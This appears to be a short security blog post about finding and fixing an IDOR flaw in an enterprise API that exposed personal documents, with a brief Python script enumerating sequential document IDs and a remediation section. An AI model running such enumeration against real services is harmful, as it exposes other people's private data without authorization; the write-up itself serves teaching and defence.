---
author: Sreehari
pubDatetime: 2025-08-22T09:30:00Z
title: "How I Patched a 150GB Data Leak: The Anatomy of an IDOR"
featured: true
draft: false
tags:
  - AppSec
  - Bug Bounty
  - Cloudflare
description: "A deep dive into discovering and remediating a critical Insecure Direct Object Reference vulnerability exposing hundreds of gigabytes of PII."
---

## The Anatomy of an IDOR

IDORs (Insecure Direct Object References) are notoriously simple but incredibly destructive. While analyzing an enterprise web application's API, I noticed that document retrieval requests used sequential, predictably generated integer IDs.

## The Exploit

A simple enumeration script proved that authorization checks were entirely missing on the `GET /api/v1/documents/{id}` endpoint.

```python
import requests

for i in range(1000, 5000):
    res = requests.get(f"https://api.example.com/api/v1/documents/{i}")
    if res.status_code == 200:
        print(f"Leaked document {i}")
```

## Remediation

I worked with the team to implement UUIDv4 for document referencing and enforced strict resource-level authorization checks at the API gateway layer using Cloudflare Workers.
